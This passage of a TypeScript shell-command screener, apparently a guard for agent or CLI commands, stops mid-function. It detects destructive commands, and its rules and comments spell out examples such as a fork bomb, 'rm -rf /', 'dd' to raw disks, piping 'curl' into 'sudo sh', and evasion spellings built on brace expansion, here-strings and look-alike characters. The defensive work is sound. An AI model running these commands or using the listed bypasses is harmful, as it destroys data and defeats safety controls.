import {
  braceCollapsed,
  braceExpansions,
  braceExpansionsDepthFirst,
  candidateArgvs,
  commandBasename,
  COMMAND_WRAPPERS,
  effectiveWords,
  HERESTRING_OP,
  parseShell,
  type ShellWord,
  type SimpleCommand,
} from '../shell-parse.js';
import { osFold } from '../../os-fold.js';
import {
  COMMAND_CARRIERS,
  DEVICE_WRITE_VERBS,
  DOWNLOADERS,
  FORCE_FLAG,
  INTERPRETER_CODE_FLAGS,
  INTERPRETERS,
  MAX_SCREEN_DEPTH,
  RECURSIVE_FLAG,
  SHELLS,
  type DeviceWriteVerb,
} from './constants.js';
import {
  dangerousTarget,
  deviceSpelling,
  isRawDevice,
  sensitiveTarget,
} from './device.js';
import {
  balancedTail,
  braceLost,
  conservativeCommands,
  continuationTails,
  splitArgs,
} from './shell-args.js';

/**
 * F-4 - A POSITIONAL PROPERTY TESTED BY A SCAN OVER ALL OPERANDS
 * IS NOT A POSITIONAL PROPERTY.
 *
 * The read-mode test used to ask "does ANY argument look like a read mode?".
 * That is one ordinary filename away from failing open, and it was:
 *
 * tar cf /dev/disk0 etc   ->  ALLOWED
 * tar cf /dev/disk0 usr   ->  refused "overwrite a block device"
 *
 * `etc` contains `t`, one of `tar`'s read letters; `usr` does not. That was the
 * whole difference between destroying a disk and being refused, and NOTHING
 * about the spelling is unusual - which is why no count of verbs, no name-level
 * diff and no register saw it. F-2c-47 closed this class at the COVERAGE site
 * and left the EXEMPTION unanchored.
 *
 * So: a mode word counts only where the utility's own grammar puts one.
 * - an OPTION-spelled mode (`-l`, `--list`, `-x`) is in mode position wherever
 * an option is legal, and its spelling already means an ordinary operand
 * cannot equal it;
 * - a BARE-WORD mode is a SUB-COMMAND and sits where `modeAt` says it sits.
 */
function modeWords(v: DeviceWriteVerb, args: string[]): string[] {
  const options = args.filter((a) => a.startsWith('-'));
  if (v.modeAt === undefined) return options;
  if (v.modeAt === 'first-argument') {
    const first = args[0];
    return first === undefined ? options : [...options, first];
  }
  // 'after-device': `parted DEVICE command …` - the sub-command follows the device
  const cmd = splitArgs(args, v.valueOptions).operands[1];
  return cmd === undefined ? options : [...options, cmd];
}

/**
 * F-7 - IS THIS INVOCATION A DOCUMENTED READ, AT WHATEVER DEPTH
 * THE VERB'S OWN VOCABULARY REACHES?
 *
 * A namespace does not decide anything by itself - it DELEGATES, so the mode is
 * the word after it. Where `args[0]` names a namespace the depth-1 allowlist is
 * deliberately NOT consulted: a namespaced invocation is judged only by that
 * namespace's own read set, so an unrecognised sub-verb reaches the screen
 * rather than inheriting a depth-1 exemption it was never granted.
 */
function isDocumentedRead(v: DeviceWriteVerb, args: string[]): boolean {
  const first = args[0];
  if (v.namespaces !== undefined && first !== undefined) {
    const reads = v.namespaces[first];
    if (reads !== undefined) {
      const sub = args[1];
      return sub !== undefined && reads.includes(sub);
    }
  }
  return v.readModes?.some((m) => modeWords(v, args).includes(m)) === true;
}

function chainWrites(v: DeviceWriteVerb, args: string[]): boolean {
  if (v.chains !== true) return false;
  const dest = v.destructiveCommands ?? [];
  for (let i = 0; i < args.length; i += 1) {
    const a = args[i] as string;
    // a terminal command ends the chain only in its TERMINAL FORM. `help`
    // takes at most one command name, so at most one word may follow it; beyond
    // that the extra words are further chained commands and must be examined.
    if (v.consumesRest?.includes(a)) {
      if (args.length - i <= 2) return false;
      continue;
    }
    if (dest.includes(a)) return true;
  }
  return false;
}

/**
 * The operands a verb's own synopsis puts in a write/alter position, or `[]`
 * when the invocation is in a documented read-only mode.
 */
function deviceWriteTargets(name: string, args: string[]): string[] {
  const v = DEVICE_WRITE_VERBS.get(name);
  if (v === undefined) return [];
  if (v.writeModes !== undefined) {
    // THE INVERTED MEMBER IS DELIBERATELY NOT ANCHORED. `pax` screens only
    // when a write mode is PRESENT, so a stray operand that happens to equal
    // `-w` can only turn screening ON. Anchoring here could only loosen it.
    if (!v.writeModes.some((m) => args.includes(m))) return [];
  } else {
    if (isDocumentedRead(v, args) && !chainWrites(v, args)) return [];
    // a bundled mode word carries no dash of its own (`tar xf`, `tar tvf`) and
    // the old option style must be the FIRST argument; the same letters spelled
    // as a short option (`tar -C /tmp -xf DEV`) are in mode position anywhere.
    if (v.readLetters !== undefined) {
      const letters = v.readLetters;
      const first = args[0];
      const inModePosition = [
        ...args.filter((a) => a.startsWith('-') && !a.startsWith('--')),
        ...(first !== undefined && !first.startsWith('-') ? [first] : []),
      ];
      if (inModePosition.some((a) => /^-?[a-zA-Z]+$/.test(a) && [...letters].some((l) => a.includes(l)))) {
        return [];
      }
    }
  }
  const { operands } = splitArgs(args, v.valueOptions);
  switch (v.role) {
    case 'last':
      // one operand is a source with no destination - nothing is written
      return operands.length >= 2 ? [operands[operands.length - 1] as string] : [];
    case 'after-first':
      return operands.slice(1);
    case 'first':
      return operands.slice(0, 1);
    case 'all':
      return operands;
    case 'archive': {
      // EVERY SPELLING OF THE ARCHIVE FLAG, including the long form with an
      // ATTACHED value: `tar --create --file=/dev/sda src` never matched
      // `indexOf('-f')` at all, so the archive was resolved from the operands
      // and the device was never seen.
      for (const spelling of v.archiveFlags ?? [v.flag as string]) {
        const i = args.indexOf(spelling);
        if (i >= 0 && args[i + 1] !== undefined) return [args[i + 1] as string];
        const attached = args.find((a) => a.startsWith(`${spelling}=`));
        if (attached !== undefined) return [attached.slice(spelling.length + 1)];
      }
      // THE LONG-OPTION INJECTION CHANNEL, WHICH NO MAN PAGE HERE DOCUMENTS.
      // `bsdtar` and `bsdcpio` accept `-W <longopt>=<value>`, and `-W file=PATH`
      // names the ARCHIVE with no `-f` token anywhere in the vector:
      //
      // tar -c -W file=/dev/sda src        writes the raw device
      // cpio -o -W file=/dev/sda           writes the raw device
      //
      // Verified by driving the real binaries against a fenced path - both
      // spellings created the archive, and `-W SENTINELVAL` answers "Option -W
      // SENTINELVAL is not supported", which proves `-W` consumes its value.
      // The SEPARATE form happened to be refused already, but only because
      // the bundled-word heuristic below reads the word `file` as a mode word
      // containing `f` - an accident UPSTREAM of any `-W` handling. Relying on
      // that would be a cell decided by something other than the predicate, so
      // both spellings are resolved here explicitly.
      for (const inj of v.archiveInjectors ?? []) {
        const i = args.indexOf(inj);
        if (i < 0) continue;
        const val = args[i + 1];
        if (val === undefined) continue;
        if (val.startsWith('file=')) return [val.slice('file='.length)];
        if (val === 'file' && args[i + 2] !== undefined) return [args[i + 2] as string];
      }
      // `tar cf ARCHIVE .` - the bundled mode word has no leading dash, so it
      // is itself an OPERAND and the archive is the one after it. Taking
      // operand[0] left 21 grid cells and 4 traversals open while measuring.
      //
      // F-5 - AND THE ARGUMENTS FOLLOW IN THE ORDER OF THE LETTERS. tar(1):
      // "The order of the arguments must match the order of the corresponding
      // characters in the bundled command word … tar tbf 32 file.tar … The b
      // and f flags both require arguments." So the archive is the Nth word
      // after the bundled one, counting the argument-taking letters before
      // `f`. Taking operand[1] unconditionally resolved
      // `tar cbf 32 /dev/sda src` as `32`, and the device was never screened.
      const first = operands[0];
      if (first !== undefined && /^-?[a-zA-Z]+$/.test(first) && first.includes('f')) {
        const letters = first.replace(/^-/, '');
        const valued = v.bundledValueLetters ?? 'f';
        let ahead = 0;
        for (const ch of letters) {
          if (ch === 'f') break;
          if (valued.includes(ch)) ahead += 1;
        }
        return operands[1 + ahead] !== undefined ? [operands[1 + ahead] as string] : [];
      }
      return first !== undefined ? [first] : [];
    }
  }
}

/**
 * Screen `command` and everything it would run. The union of: the parsed simple
 * commands, every `$( … )` interior, every `sh -c` payload, and - ONLY when the
 * parse is not confident - a crude whitespace tokenization as a fallback.
 *
 * THE FALLBACK IS NOT A SECOND RULE SET. It is a second candidate
 * TOKENIZATION fed to the same rules, so there is still one instrument. It
 * exists because a parser that silently mis-read a malformed command would open
 * exactly the hole the predecessor's split-only design could not open.
 */
export function screenShell(command: string, depth: number, restoreContinuations = true, nested = false): string | null {
  // The fork bomb is a whitespace-insensitive SHAPE, not a command word - the
  // only rule that is genuinely about raw text.
  if (command.replace(/\s+/g, '').includes(':(){:|:&};:')) return 'fork bomb';

  const parsed = parseShell(command);
  const hit = screenCommands(parsed.commands, depth, nested);
  if (hit) return hit;

  // F-19 - SCREEN WHAT THE SHELL WILL ACTUALLY RUN.
  //
  // The shell brace-expands the command line BEFORE it splits words, so a brace
  // sitting INSIDE a dangerous literal vanishes and the word is restored:
  // `o{f..f}=/dev/sda` becomes `of=/dev/sda`. The parser instead lexes `{` as an
  // unconditional command terminator, shredding the word before any rule sees
  // it - and leaving `confident` TRUE, so the conservative fallback never fired
  // either. A SILENT miss, the same shape as the line continuation and `$'…'`.
  //
  // Measured against the published `0.6.0`, which screened raw text and so
  // still saw the literal: **101 byte-identical cells across 13 rule cores**
  // that 0.6.0 BLOCKS and HEAD ALLOWED - at `matchesCatastrophic`, the one
  // control `--yes` cannot override. Pinned by `screen-differential.test.ts`.
  //
  // It runs AFTER the primary screen and only ADDS readings, so nothing that
  // matched before can stop matching. `braceExpansions` returns `[]` when there
  // is no brace at all, which is the overwhelming majority of commands.
  // F-21 - TWO READINGS THAT SURVIVE BOTH BOUNDS, ADDED AFTER THE BOUNDED
  // EXPANSION AND NEVER INSTEAD OF IT.
  let braceRepaired = !braceLost(parsed);
  for (const expanded of braceExpansions(command)) {
    const expandedParse = parseShell(expanded);
    const expandedHit = screenCommands(expandedParse.commands, depth, nested);
    if (expandedHit) return expandedHit;
    if (!braceLost(expandedParse)) braceRepaired = true;
  }
  // (1) The COLLAPSED reading - every group replaced by its first alternative.
  // the same bounded expansion explored DEPTH-FIRST, which backtracks from the
  // right and so reaches a trailing group while a leading one is still being
  // enumerated - the only reading that can need two groups off their first
  // alternative at once.
  for (const expanded of braceExpansionsDepthFirst(command)) {
    const p = parseShell(expanded);
    const hit = screenCommands(p.commands, depth, nested);
    if (hit) return hit;
    if (!braceLost(p)) braceRepaired = true;
  }
  for (const collapsed of braceCollapsed(command)) {
    const collapsedParse = parseShell(collapsed);
    const collapsedHit = screenCommands(collapsedParse.commands, depth, nested);
    if (collapsedHit) return collapsedHit;
    if (!braceLost(collapsedParse)) braceRepaired = true;
  }
  // (2) The RAW-TEXT reading - for a brace the shell leaves literal (`{R}`, an
  // unmatched `{`), there is nothing to expand and nothing to collapse, yet the
  // parser still shredded the word. `conservativeCommands` does not split on
  // braces, so it reads the text the way the published 0.6.0 did. Only reached
  // when no reading repaired the blindness, so ordinary work pays nothing.
  if (!braceRepaired) {
    const rawHit = screenCommands(conservativeCommands(command, nested), depth, nested);
    if (rawHit) return rawHit;
  }

  // F-2c-40 - a substitution interior at the budget is FLATTENED, not
  // skipped: `$( $( $( $( rm -rf / ) ) ) )` was allowed for the same reason a
  // four-deep `sh -c` chain was.
  for (const interior of parsed.substitutions) {
    const inner = screenNested(interior, depth, true);
    if (inner) return inner;
  }

  // - THE READING IN WHICH THE CONTINUATION IS A FORMATTING
  // ARTIFACT RATHER THAN A CHARACTER DELETION.
  //
  // THE GATE IS THE WHOLE OF THE CORRECTNESS, AND IT IS `> 1 COMMAND`.
  // A tail that parses to ONE command has all its danger in a verb the glue
  // destroys - `rm -rf /` really does become `arm -rf /` - so it stays excused
  // and this reading is never taken. A tail that parses to MORE THAN ONE
  // command puts a SECOND PROGRAM on the line, and the glue cannot reach it.
  // That is the difference between the 1,200 cells this restores and the 125
  // cells it must leave alone, and it was chosen by pricing six candidates over
  // one population of 7,810: the ungated form costs 128 over-blocks (125 of
  // them the excused class itself), the form whose gate also accepts a
  // REDIRECTION costs 5 (`rm -rf />/dev/null`, whose danger is its first token
  // and whose redirection is to `/dev/null`), and this one costs ZERO.
  //
  // THE GATE IS ANCHORED TO THE TAIL, NEVER TO THE WHOLE INPUT. Asking
  // whether the whole command holds more than one operator instead over-blocks
  // `echo a | cat b\`+LF+`rm -rf /`, which is ordinary text - the exemption
  // predicate shape `F-3` recorded, where a test that searches the whole input
  // fails open on benign data. Both readings are pinned as tests.
  //
  // It runs AFTER the primary screen and only ADDS a reading, so nothing that
  // matched before can stop matching, and `continuationTails` returns `[]` for
  // any command with no continuation at all - the overwhelming majority.
  //
  // NO RECURSION. `continuationTails` already enumerates EVERY pair in the
  // whole command, including the pairs inside earlier tails, so a tail's own
  // tails are already members of this same list. The recursive call is
  // suppressed to keep the cost linear in the number of pairs instead of
  // exponential in it.
  if (restoreContinuations) {
    for (const tail of continuationTails(command)) {
      // R-CLI-4 - the gate asks whether the tail puts a SECOND PROGRAM on
      // the line. A tail cut at a pair INSIDE a substitution carries the
      // enclosing construct's own closer (`)`, `"`), and that punctuation alone
      // raises the parsed command count - so the gate passed on tails whose
      // danger the glue really does destroy. Require the tail to be balanced
      // before its command count is believed.
      if (!balancedTail(tail)) continue;
      if (parseShell(tail).commands.length <= 1) continue;
      const restored = screenShell(tail, depth, false, nested);
      if (restored) return restored;
    }
  }

  // R-CLI-5 - ONE BOOLEAN WAS DOING TWO UNRELATED JOBS, AND THE
  // SECOND ONE IS NOT ITS BUSINESS.
  //
  // R-CLI-4 wrote `nested || parsed.boundExceeded` here. Those two facts are not
  // the same fact:
  //
  // `nested`          - WE ARE INSIDE A SUBSTITUTION INTERIOR, where a word
  // can be a MENTION rather than a command. That, and only
  // that, is what licenses dropping the invented candidate
  // readings.
  // `boundExceeded`   - SOME CONSTRUCT ON THIS LINE WAS DEEPER THAN WE MODEL.
  // It says nothing about which characters belong to it,
  // and a command sitting BESIDE that construct is not
  // inside anything at all.
  //
  // At the TOP level `nested` is false, so the second flag alone switched off the
  // suppression for the WHOLE LINE. Twenty-eight characters of balanced
  // parentheses in front of a command turned off the reading that stops
  // `arch -arm64 rm -rf /` - a command the published 0.6.0 refuses, and which
  // `LAUNCHER_UNMODELLED_HOSTILE` keeps a committed test to keep refusing. That
  // test was green: every cell in it is spelled without the prefix.
  //
  // WHAT THE BOUND *IS* ENTITLED TO DECIDE is how the text must be READ. A
  // construct we declined to model is still text a real shell applies its own
  // continuation rule to, so the conservative reading must still GLUE. Keeping
  // the glue is worth 24 measured over-blocks against the published release;
  // dropping the flag outright - R-REVIEW-4's own prescribed repair - costs
  // exactly those 24 and still leaves 6 live under-blocks standing.
  //
  // PRICED, TEN CANDIDATES, FIVE POPULATIONS, BOTH DIRECTIONS. Three reached
  // zero introduced live under-blocks; two of them bought it with 24 new
  // capability removals against the published release on the product corpus and
  // 30 on this repository's own. This split buys it with NONE. Its ablation:
  // the split alone leaves 384 live under-blocks, the escape rule below alone
  // leaves 108, together they leave ZERO. Neither half is decorative.
  const glue = nested || parsed.boundExceeded;
  const suppress = nested;
  if (!parsed.confident) return screenCommands(conservativeCommands(command, glue, suppress), depth, suppress);
  return null;
}

/**
 * F-2c-40 - THE READING USED WHEN THE MODELLING BUDGET IS EXHAUSTED.
 *
 * `MAX_SCREEN_DEPTH` used to be a silent ceiling: every recursion site was
 * guarded with `depth < MAX_SCREEN_DEPTH` and simply DID NOTHING beyond it, so
 * a fourth nested payload was never screened by any rule and was ALLOWED.
 * Nothing distinguished "too deep to model" from "screened and clean". Measured
 * at F-2c-40 over the differential's own 58 cores: **0 regressions at 1 and 2
 * layers, 2 at 3 layers, and 46 of 58 at 4 and beyond**, identically for `sh -c`
 * chains, `eval` chains and a MIXED ring where no carrier repeats.
 *
 * THE FIX IS NOT A BIGGER NUMBER. Raising the constant moves the boundary and
 * leaves the shape behind it - the ruling this repository already reached for
 * `SAFE_DEVICES` and for the substitution bound - and it is not free either: the
 * carrier arm screens every suffix at `depth + 1`, so the cost is exponential in
 * the bound and a large one turns the screen itself into a hang.
 *
 * So the bound STAYS and the overflow becomes a DECISION. Beyond the budget
 * the payload is handed to the SAME conservative reading an unconfident parse
 * already gets: quotes stripped, split on the operator table, every suffix
 * offered as a candidate argv. That flattens every remaining layer at once, so
 * one pass suffices however deep the nesting goes - and it can only ever block
 * MORE, never less. `MAX_SCREEN_DEPTH + 1` is passed so the flattened reading
 * cannot re-enter this path; the flattening already contains everything below.
 *
 * Its benign cost is the conservative screen's own, which is measured: 0 of
 * the 141 ordinary commands in the differential's benign corpus reach it.
 */
function screenBeyondDepth(text: string, nested = false): string | null {
  return screenCommands(conservativeCommands(text, nested), MAX_SCREEN_DEPTH + 1, nested);
}

/** Recurse into a nested payload, or - at the budget - flatten it. Never skip. */
function screenNested(text: string, depth: number, nested = false): string | null {
  if (depth < MAX_SCREEN_DEPTH) return screenShell(text, depth + 1, true, nested);
  if (depth === MAX_SCREEN_DEPTH) return screenBeyondDepth(text, nested);
  return null;
}

/**
 * R-CLI-4 - MAY THIS COMMAND EXECUTE ITS OPERANDS, OR DOES IT NAME AN
 * OBJECT WHOSE PROTECTION DOES NOT DEPEND ON THAT?
 *
 * Inside a substitution interior the invented candidate-suffix readings are
 * suppressed, because they read a MENTION as a command: `$(echo rm -rf /)`
 * passes `rm -rf /` to `echo` as data and the published 0.6.0 permits it.
 * Two things are exempt, and both were forced by measurement rather than
 * chosen:
 *
 * 1. a head this repository already models as EXECUTING its operands - a
 * wrapper, a carrier, an interpreter or a shell;
 * 2.  a word naming a RAW DEVICE or a SENSITIVE FILE. Those rules key on
 * the OBJECT, not on which word is the command - `screenCommands`
 * already screens redirect targets BEFORE it requires a head word for
 * exactly that reason - and suppressing them cost 72 MEASURED
 * under-blocks against the published 0.6.0 on an executor in none of the
 * lists in (1). It buys nothing on the other side either: the published
 * release refuses `mkfs.ext4 /dev/sda` and `dd … of=/dev/sda` wherever
 * they appear, whatever the head.
 *
 * The operand is read the way `deviceWriteTargets` reads it, including the
 * `NAME=value` form: the first build asked `isRawDevice` on the raw word,
 * missed `of=/dev/sda`, and left 36 of those under-blocks standing.
 */
function headMayExecOperands(cmd: SimpleCommand): boolean {
  for (const w of cmd.words) {
    const n = osFold(commandBasename(w.value));
    if (COMMAND_WRAPPERS.has(n) || COMMAND_CARRIERS.has(n) || INTERPRETERS.has(n) || SHELLS.has(n)) return true;
    const eq = w.value.indexOf('=');
    const operand = eq > 0 && /^[A-Za-z_][A-Za-z0-9_]*$/.test(w.value.slice(0, eq)) ? w.value.slice(eq + 1) : w.value;
    if (isRawDevice(operand) || sensitiveTarget(operand)) return true;
  }
  return false;
}

function screenCommands(commands: SimpleCommand[], depth: number, nested = false): string | null {
  for (let i = 0; i < commands.length; i += 1) {
    const cmd = commands[i] as SimpleCommand;

    // F-2c-25 - REDIRECTIONS ARE SCREENED BEFORE A HEAD WORD IS REQUIRED.
    // `> /dev/sda` and `> /etc/passwd` are valid `sh` and destructive, and
    // `parseShell` returns `words: []` for them because there is no command
    // word at all. Every rule below keys on the head, so a wordless command was
    // never screened by anything - measured, 101 shapes, all of which the
    // published 0.6.0 refused. Verified on a real file: `/bin/sh -c "> f"`
    // truncated it to 0 bytes, rc=0.
    for (const target of cmd.redirects.map((w) => w.value)) {
      if (isRawDevice(target)) return 'overwrite a block device';
      if (sensitiveTarget(target)) {
        return 'overwrite a sensitive credential/shell-init/system file';
      }
    }

    // F-2c-40 - EVERY CANDIDATE ARGV, NOT ONE READING. `effectiveWords`
    // has to decide which word is the command, and a wrapper option that takes
    // a VALUE makes that decision wrong (`timeout -s KILL 5 rm -rf /` was read
    // as an invocation of `KILL`). `candidateArgvs` returns the same primary
    // reading FIRST - so the adjacency-sensitive rules still see the real
    // sequence - and then every suffix. See its header for why this is not an
    // option-arity table.
    for (const words of (nested && !headMayExecOperands(cmd) ? [effectiveWords(cmd)] : candidateArgvs(cmd))) {
      const hit = screenArgv(words, cmd, commands, i, depth);
      if (hit) return hit;
    }
  }
  return null;
}

/**
 * The rule set, applied to ONE candidate argv of ONE simple command.
 *
 * `cmd`, `commands` and `i` are carried because three rules read more than their
 * own argv - a download piped into a shell asks what the NEXT stage is, and a
 * bare `rm -rf` fed by a pipe asks what the PREVIOUS one passed it. A candidate
 * tokenization must preserve the sequence, not only the words (F-2c-30 measured
 * 24 shapes surviving when it did not).
 */
function screenArgv(
  words: ShellWord[],
  cmd: SimpleCommand,
  commands: SimpleCommand[],
  i: number,
  depth: number,
): string | null {
  {
    const head = words[0];
    if (head === undefined) return null;
    // F-22 - THE VERB IS A NAME THE OS RESOLVES TOO, AND FIXING THE
    // TARGETS WITHOUT FIXING THIS CLOSED THE CLASS AT ONE SITE ONLY. Every
    // comparison below is against lower-case ASCII (`rm`, `dd`, `tee`, SHELLS,
    // DOWNLOADERS, DEVICE_WRITE_VERBS …), and `osFold` is identical to
    // `toLowerCase` on ASCII input - so this is a strict SUPERSET of the previous
    // matching and cannot remove a single refusal. Measured before it: `ſh -c
    // "rm -rf /usr"` was ALLOWED while `sh -c "rm -rf /usr"` was blocked, because
    // the head word never matched SHELLS and the payload was therefore never
    // screened at all.
    const name = osFold(commandBasename(head.value));
    const args = words.slice(1).map((w) => w.value);
    // R-CLI-2 - THE RAW SPELLING, KEPT BESIDE THE PARSED VALUE, FOR OPERANDS
    // THAT ARE CODE. Inside `"…"` POSIX removes a `\`+LF and GLUES the words, and
    // the parser models that correctly - which is right for the OUTER shell and
    // WRONG for a string that a NESTED interpreter will read as a command line.
    // `sh -c "echo a\`+LF+`curl … | sudo sh"` reaches the payload screen as
    // `echo acurl … | sudo sh`, whose downloader has already been destroyed, so
    // no rule fires - while the published 0.6.0 refuses it on its raw text.
    // Measured: 24 such cells, 12 of which really do spawn `sudo`.
    const rawArgs = words.slice(1).map((w) => w.raw);
    const { flags, operands } = splitArgs(args);

    // ── rm with BOTH recursive and force, aimed somewhere irreversible ──
    if (name === 'rm' && flags.some(RECURSIVE_FLAG) && flags.some(FORCE_FLAG)) {
      if (flags.includes('--no-preserve-root')) return 'rm --no-preserve-root';
      // F-2c-25 - `echo / | xargs rm -rf` HAS NO OPERAND: the target arrives
      // on stdin. `xargs` is already looked past as a wrapper, so the command
      // reads as `rm -rf` with an empty operand list and every target test was
      // skipped. The published 0.6.0 blocked it, because its text net matched
      // the ` / ` wherever it appeared. Where the operand list is empty and the
      // command is fed by a pipe, the UPSTREAM stage's operands are what `rm`
      // will receive, so they are what gets screened. Measured: 4 shapes.
      // Narrow by construction - it needs BOTH -r and -f AND an empty
      // operand list, so `find . -name '*.log' | xargs rm -f` is untouched.
      // M2: walk back through ALL upstream pipe stages (not just the
      // immediate predecessor) - `echo / | cat | xargs rm -rf` has the
      // dangerous operand two stages back. Also handle xargs -I/--replace:
      // the placeholder is substituted at runtime from stdin, so the
      // operand list is empty but the upstream content is what gets deleted.
      const piped = operands.length === 0 && i > 0 && (commands[i - 1] as SimpleCommand).terminator === '|';
      let targets: string[] = operands;
      if (piped) {
        targets = [];
        // Check if this is xargs with placeholder substitution
        const xargsWords = effectiveWords(commands[i] as SimpleCommand).slice(1).map((w) => w.value);
        const hasPlaceholder = xargsWords.some((w) => w === '-I' || w.startsWith('-I') || w === '--replace' || w.startsWith('--replace='));
        // Walk all upstream stages
        for (let j = i - 1; j >= 0; j--) {
          const stage = commands[j] as SimpleCommand;
          const stageWords = effectiveWords(stage).slice(1).map((w) => w.value);
          const { operands: stageOperands } = splitArgs(stageWords);
          for (const op of stageOperands) {
            // Unescape printf-style sequences (e.g. '/\n' -> '/')
            const unescaped = op.replace(/\\n/g, '\n').replace(/\\t/g, '\t').replace(/\\/g, '');
            targets.push(unescaped);
            targets.push(op); // also check the raw form
          }
          if (stage.terminator !== '|') break;
        }
        // If xargs uses placeholder substitution, ANY upstream content is
        // dangerous (it gets substituted into the rm command)
        if (hasPlaceholder && targets.length > 0) {
          // The placeholder means stdin content becomes rm's target;
          // if upstream produces dangerous output, block it
          for (const operand of targets) {
            const why = dangerousTarget(operand);
            if (why) return `rm -rf ${why} (via xargs placeholder)`;
          }
        }
      }
      for (const operand of targets) {
        const why = dangerousTarget(operand);
        if (why) return `rm -rf ${why}`;
      }
    }

    // ── format a filesystem ──
    if (/^mkfs(\.|$)/.test(name)) return 'mkfs (format filesystem)';

    // ── write a raw block device with dd ──
    if (name === 'dd') {
      for (const operand of operands) {
        const of = /^of=(.*)$/i.exec(operand);
        if (of && isRawDevice(of[1] as string)) return 'dd to a block device';
      }
    }

    // (redirect targets were screened above, before the head-word requirement)
    // `tee FILE` writes its operand the same way a redirect does.
    if (name === 'tee') {
      for (const operand of operands) {
        if (isRawDevice(operand)) return 'overwrite a block device';
        if (sensitiveTarget(operand)) return 'overwrite a sensitive credential/shell-init/system file';
      }
    }

    // ──  F-2c-47 - any verb that writes to or ALTERS a device node by
    // naming it. `isRawDevice` above was reachable from three places only, so
    // `cp ./f /dev/sda` and `chmod 666 /dev/sda` - and 32 other verbs - walked
    // past a classifier that would have refused every one of their targets.
    // Measured at HEAD: 714 of 714 cells allowed. It sits HERE, inside
    // `screenArgv`, so it sees every candidate argv and every nesting depth
    // rather than one reading of the plain form. `sensitiveTarget` is
    // deliberately NOT asked here: that is a different protected set with a
    // different benign cost, and widening two classes in one rule is how a
    // measured change becomes an unmeasured one.
    for (const target of deviceWriteTargets(name, args)) {
      // F-7 - resolve the SPELLING before asking whether it is a
      // device. The two spellings denote the same object, and a screen that
      // models only one of them is blind to the other by construction.
      if (isRawDevice(deviceSpelling(DEVICE_WRITE_VERBS.get(name), target))) {
        return 'overwrite a block device';
      }
    }

    // ── a network download piped into a shell: remote code execution ──
    if (DOWNLOADERS.has(name) && cmd.terminator === '|') {
      for (let j = i + 1; j < commands.length; j += 1) {
        const stage = commands[j] as SimpleCommand;
        // F-2c-40 - the SAME candidate reading as the main loop. This rule
        // asks "is the next stage a shell", which is a question about the head
        // word, so `curl x | timeout -s KILL 5 sh` hid the answer behind an
        // option value exactly as the main loop did. One mechanism, every site
        // that asks which word is the command.
        if (
          candidateArgvs(stage).some((ws) => {
            const h = ws[0];
            // F-22 - same fold as the head-verb site above: a downloader
            // piped into `ſh` is a pipe into `sh`.
            return h !== undefined && SHELLS.has(osFold(commandBasename(h.value)));
          })
        ) {
          return 'pipe a network download into a shell';
        }
        if (stage.terminator !== '|') break;
      }
    }

    // ── find … -delete / -exec rm … aimed at / ~ or a system directory ──
    if (name === 'find') {
      const destroys = args.includes('-delete') || (args.includes('-exec') && args.some((a) => osFold(commandBasename(a)) === 'rm'));
      if (destroys && operands.some((o) => dangerousTarget(o) !== null)) {
        return 'find -delete/-exec rm on / ~ or a system directory';
      }
    }

    // ── recursive chmod/chown/chgrp tree-wide ──
    if ((name === 'chmod' || name === 'chown' || name === 'chgrp') && flags.some(RECURSIVE_FLAG)) {
      if (operands.some((o) => dangerousTarget(o) !== null)) {
        return 'recursive chmod/chown on / ~ or a system directory';
      }
    }

    // ── a shell wrapper: its -c payload is another command ──
    // F-2c-40 - the guard moved INSIDE: reaching the budget with a payload
    // present is a fact about the input, and it now routes to the conservative
    // reading (`screenNested`) instead of skipping the payload silently.
    if (SHELLS.has(name)) {
      const payload = shellPayload(args);
      if (payload !== undefined) {
        const inner = screenNested(payload, depth);
        if (inner) return inner;
        // AND THE RAW SPELLING OF THE SAME OPERAND. It differs from the parsed
        // value only when the quotes hid something the parser resolved - which is
        // exactly the case that matters here. It can only ADD a reading.
        const rawInner = codeRawPayload(args, rawArgs, payload);
        if (rawInner !== undefined) {
          const hit = screenNested(rawInner, depth);
          if (hit) return hit;
        }
      } else if (i > 0 && (commands[i - 1] as SimpleCommand).terminator === '|') {
        // F-2c-25 - a BARE shell reading its script from a pipe.
        // `printf "rm -rf /" | sh` executes the upstream text; the DOWNLOADERS
        // rule only covers curl/wget/fetch, so this had no rule at all while
        // the published 0.6.0 refused it on the raw text. The upstream stage's
        // operands ARE the script, so they are what gets screened.
        const upstream = effectiveWords(commands[i - 1] as SimpleCommand).slice(1).map((w) => w.value);
        for (const chunk of splitArgs(upstream).operands) {
          const inner = screenNested(chunk, depth);
          if (inner) return inner;
        }
      } else {
        // F-2c-30 - A SHELL WITH NO `-c` AT ALL STILL RUNS ITS OPERAND.
        // `shellPayload` looks for a `-c` in a short-option cluster, so every
        // rule was skipped for `ksh 'rm -rf /'`. Measured on this host:
        // `/bin/ksh` (AT&T ksh93, the system ksh) EXECUTES a bare operand as a
        // command string when it is not a readable file -
        // `ksh 'echo X'` prints X - and the published 0.6.0 refused all 46
        // shapes on that spelling because its text net never asked for a flag.
        //
        // The benign cost is close to zero by construction: for every other
        // shell the first operand is a SCRIPT PATH (`sh build.sh`), and a path
        // screens as a command whose head is that path - which matches no rule.
        const script = operands[0];
        if (script !== undefined) {
          const inner = screenNested(script, depth);
          if (inner) return inner;
        }
      }

      // F-2c-42 - THE FOURTH ROUTE: THE SHELL'S STANDARD INPUT.
      //
      // The three arms above are `-c`, an upstream PIPE, and a bare script
      // operand - and the comment on the pipe arm shows the author reasoning
      // about exactly one non-`-c` route and stopping there. `sh <<<"rm -rf /"`
      // takes none of them: `<<<` was absent from `SHELL_OPERATORS`, so the
      // longest-match scan read `<<` then `<` and filed the SCRIPT TEXT into
      // `cmd.redirects` - where the only questions asked of it are `isRawDevice`
      // and `SENSITIVE_FILE`. **A filename test applied to what is really a
      // program.** The payload was sitting in the parse the whole time, in a
      // field the screen already reads, and was asked the wrong question.
      // Measured: **880 shapes the published 0.6.0 refuses ran at HEAD.**
      //
      // Scoped to shells deliberately: `cat <<<"rm -rf /"` PRINTS its
      // operand rather than running it, and over-blocking that would be a
      // different defect rather than a fix. It is this dimension's own
      // discriminator and it lives in the benign corpus.
      //
      // A here-DOC (`sh <<EOF … EOF`) needs no arm here: its body is on the
      // following lines, which the parser already splits into commands on the
      // newline operator and screens individually. Measured, not assumed.
      for (let r = 0; r < cmd.redirectOps.length; r += 1) {
        if (!(cmd.redirectOps[r] as string).endsWith(HERESTRING_OP)) continue;
        const body = cmd.redirects[r];
        if (body === undefined) continue;
        const inner = screenNested(body.value, depth);
        if (inner) return inner;
      }
    }

    // ── a carrier: one of its operands is itself a command ──
